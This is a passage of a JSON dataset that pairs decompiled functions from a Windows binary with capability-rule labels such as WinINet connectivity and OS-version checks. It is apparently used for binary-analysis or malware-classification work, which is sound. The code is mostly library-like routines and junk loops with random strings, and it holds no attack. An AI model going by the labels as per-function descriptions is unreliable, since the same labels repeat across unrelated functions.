        "decompiled_code": "\nuint __cdecl fcn.00401bf4(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00401c17": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401c17(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00404999(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.004028c4(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 437
    },
    "00401c1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00401c1c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.00405434(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.004032d3(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.004042eb(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405146();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.004042c3(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.0040650f(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 695
    },
    "00401c8f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040cdc6)\n\nuint fcn.00401c8f(void)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return 0x181;\n}\n",
        "token_count": 71
    },
    "00401cc1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00401cc1(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.004062e9(arg_8h);\n    var_4h = var_4h + 1;\n    puVar1 = fcn.004033dc(var_4h, 1);\n    var_ch = puVar1;\n    if (puVar1 == NULL) {\n        fcn.00401096();\n    }\n    for (; var_4h != 0; var_4h = var_4h + -1) {\n        *var_ch = *arg_8h;\n        arg_8h = arg_8h + 1;\n        var_ch = var_ch + 1;\n    }\n    return puVar1;\n}\n",
        "token_count": 209
    },
    "00401cdf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401cdf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00404999(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.0040117c(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 436
    },
    "00401d16": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401d16(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00404b24();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a8a34:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a8a34;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.00403a35();\n                            *puVar4 = 0x16;\n                            fcn.004037ce();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 458
    },
    "00401d1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00401d1b(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.004056aa(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x0047a04e:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ff6(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x0047a04e;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x0047a05a;\n        fVar4 = fcn.00402bf3(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x0047a05a:\n    cVar3 = fcn.00401a8c(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 574
    },
    "00401d2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d2a(uint arg_8h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    for (var_20h = 0x24; 0 < var_20h; var_20h = var_20h + -1) {\n    }\n    for (var_24h = 0x19; 0 < var_24h; var_24h = var_24h + -1) {\n    }\n    for (var_28h = 0x52; 0 < var_28h; var_28h = var_28h + -1) {\n    }\n    fcn.00401e79(\"losfagbazazjguzqmwv\");\n    return arg_8h;\n}\n",
        "token_count": 234
    },
    "00401d3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401d3e(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57504c != 0) {\n        iVar2 = fcn.00405fb0(arg_8h, arg_ch, arg_10h, 0);\n        return iVar2;\n    }\n    if ((arg_8h != NULL) && (arg_ch != NULL)) {\n        if (arg_10h != 0) {\n            do {\n                uVar3 = *arg_8h;\n                if (uVar3 - 0x41 < 0x1a) {\n                    uVar3 = uVar3 + 0x20;\n                }\n                uVar4 = *arg_ch;\n                arg_8h = arg_8h + 1;\n                if (uVar4 - 0x41 < 0x1a) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg_ch = arg_ch + 1;\n            } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n            return uVar3 - uVar4;\n        }\n        return 0;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0x7fffffff;\n}\n",
        "token_count": 372
    },
    "00401d52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401d52(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint32_t uVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_ch;\n    \n    arg_ch = 0x28;\n    fcn.00403120();\n    uVar7 = *0x574460;\n    *0x574470 = *0x574470 + 1;\n    *(unaff_EBP + -4) = 0;\n    if ((uVar7 & 0x2000) == 0) {\n        if (**0x574458 != '?') {\n            if (**0x574458 == '\\0') {\n                fcn.004017df(1);\n            }\n            else {\n                puVar4 = *(unaff_EBP + 8);\n                puVar4[1] = 0;\n                *(puVar4 + 1) = 2;\n                *puVar4 = 0;\n            }\n            goto code_r0x0048efff;\n        }\n        pcVar3 = *0x574458 + 1;\n        if ((*pcVar3 != '?') || ((*0x574458)[2] != '?')) {\n            *0x574458 = pcVar3;\n            fcn.00401460(unaff_EBP + -0x18);\n            iVar5 = *(unaff_EBP + -0x18);\n            uVar7 = *(unaff_EBP + -0x14);\n            if ((iVar5 == 0) || ((uVar7 & 0x200) == 0)) {\n                *(unaff_EBP + -0x10) = 0;\n            }\n            else {\n                *(unaff_EBP + -0x10) = 1;\n            }\n            uVar8 = uVar7 >> 0xf;\n            if (uVar7 < '\\x02') {\n                if ((**0x574458 != '\\0') && (**0x574458 != '@')) {\n                    fcn.00403a80(unaff_EBP + -0x28);\n                    if (*(unaff_EBP + -0x28) != 0) {\n                        if (*0x574464 == '\\0') {\n                            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x28);\n                            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x24);\n                            *(unaff_EBP + -0x30) = 0x555750;\n                            *(unaff_EBP + -0x2c) = 2;\n                            fcn.00405d71(unaff_EBP + -0x30);\n                            iVar5 = unaff_EBP + -0x28;\n                        }\n                        else {\n                            *0x574464 = '\\0';\n                            *(unaff_EBP + -0x20) = iVar5;\n                            *(unaff_EBP + -0x1c) = uVar7;\n                            fcn.00402eeb(unaff_EBP + -0x28);\n                            pcVar3 = *0x574458;\n                            iVar5 = *(unaff_EBP + -0x20);\n                            uVar7 = *(unaff_EBP + -0x1c);\n                            *(unaff_EBP + -0x18) = iVar5;\n                            cVar1 = *pcVar3;\n                            *(unaff_EBP + -0x14) = uVar7;\n                            if (cVar1 == '@') goto code_r0x0048ef4a;\n                            puVar4 = fcn.00403a80(unaff_EBP + -0x30);\n                            *(unaff_EBP + -0x28) = 0x555750;\n                            *(unaff_EBP + -0x24) = 2;\n                            uVar2 = *puVar4;\n                            *(unaff_EBP + -0x1c) = puVar4[1];\n                            *(unaff_EBP + -0x20) = uVar2;\n                            fcn.00405d71(unaff_EBP + -0x28);\n                            iVar5 = unaff_EBP + -0x30;\n                        }\n                        piVar6 = fcn.004053b7(iVar5, arg_ch);\n                        uVar7 = piVar6[1];\n                        iVar5 = *piVar6;\n                        *(unaff_EBP + -0x14) = uVar7;\n                        *(unaff_EBP + -0x18) = iVar5;\n                    }\n                }\ncode_r0x0048ef4a:\n                if ((*(unaff_EBP + -0x10) != 0) && (iVar5 != 0)) {\n                    uVar7 = uVar7 | 0x200;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((uVar8 & 1) != 0) {\n                    uVar7 = uVar7 | 0x8000;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((iVar5 != 0) && ((uVar7 & 0x1000) == 0)) {\n                    if (**0x574458 != '\\0') {\n                        if (**0x574458 != '@') {\n                            puVar4 = *(unaff_EBP + 8);\n                            puVar4[1] = 0;\n                            *puVar4 = 0;\n                            *(puVar4 + 1) = 2;\n                            goto code_r0x0048efff;\n                        }\n                        *0x574458 = *0x574458 + 1;\n                    }\n                    if ((((*0x574460 & 0x1000) == 0) || (*(unaff_EBP + -0x10) != 0)) || ((uVar7 & 0x8000) != 0)) {\n                        fcn.0040318e(*(unaff_EBP + 8), unaff_EBP + -0x18);\n                        goto code_r0x0048efff;\n                    }\n                    *(unaff_EBP + -0x30) = 0;\n                    *(unaff_EBP + -0x2c) = 0;\n                    fcn.0040318e(unaff_EBP + -0x28, unaff_EBP + -0x30);\n                }\n            }\n            piVar6 = *(unaff_EBP + 8);\n            *piVar6 = iVar5;\n            piVar6[1] = uVar7;\n            goto code_r0x0048efff;\n        }\n        *0x574458 = pcVar3;\n        fcn.00401d52(unaff_EBP + -0x28);\n        for (; **0x574458 != '\\0'; *0x574458 = *0x574458 + 1) {\n        }\n    }\n    else {\n        *0x574460 = uVar7 & 0xffffdfff;\n        fcn.00404c8c(unaff_EBP + -0x28, 0);\n        *0x574460 = *0x574460 | 0x2000;\n    }\n    puVar4 = *(unaff_EBP + 8);\n    *puVar4 = *(unaff_EBP + -0x28);\n    puVar4[1] = *(unaff_EBP + -0x24);\ncode_r0x0048efff:\n    *0x574470 = *0x574470 + -1;\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 1773
    },
    "00401d61": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401d61(int32_t *param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x427100;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if (*param_1 != 0) {\n        var_10h = 0;\n        fcn.00404179(*param_1);\n    }\n    *param_1 = 0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 167
    },
    "0041d490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d490(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404746();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "00401dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401dc0(uint arg_8h)\n\n{\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    \n    for (iStack64 = 0x18; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    for (iStack68 = 0x2b; 0 < iStack68; iStack68 = iStack68 + -1) {\n    }\n    for (iStack72 = 0x51; 0 < iStack72; iStack72 = iStack72 + -1) {\n    }\n    fcn.00403b02();\n    return 0x52;\n}\n",
        "token_count": 160
    },
    "00401e1f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401e1f(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack168;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x44ffe0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"jamauqbwsrhedupcadezfrfayajjsvjpfkubpzggsvumqimdoidlgnrfidcjfwqccuompatrtmsafyxyrmmhedkqs\");\n    uStack24 = 1;\n    fcn.00401e79(\"okfawvpehfwjvvovkvfklenexdsapxdhbwwuzzooajgibjzjrgjkwvgl\");\n    uStack24 = 2;\n    fcn.00401e79(\"srwclfzbjrkktczihbwkvxsofmtgxqljzawpokbphyhmebupmtsalwedzhrnyydbkrhwdcstom\");\n    uStack24 = 3;\n    fcn.00401e79(\"yteeuenqkjxlgzqmtjmxhvarbsqmkbunhniutttejlugzergbljippqihezdsfxelmvqelanvpodbdyesdn\");\n    for (iStack168 = 9; 0 < iStack168; iStack168 = iStack168 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x11326;\n}\n",
        "token_count": 439
    },
    "00401e24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e24(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 340
    },
    "00401e2e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401e2e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049dd0f;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049dd0f:\n    return Var2 << 8;\n}\n",
        "token_count": 184
    },
    "00401ec4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401ec4(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h + 0x23 <= arg_8h) {\n        fcn.00405169();\n    }\n    iVar1 = fcn.00402cbb(arg_8h + 0x23);\n    if (iVar1 == 0) {\n        fcn.004048ae();\n    }\n    uVar2 = iVar1 + 0x23U & 0xffffffe0;\n    *(uVar2 - 4) = iVar1;\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "00401ec9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401ec9(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            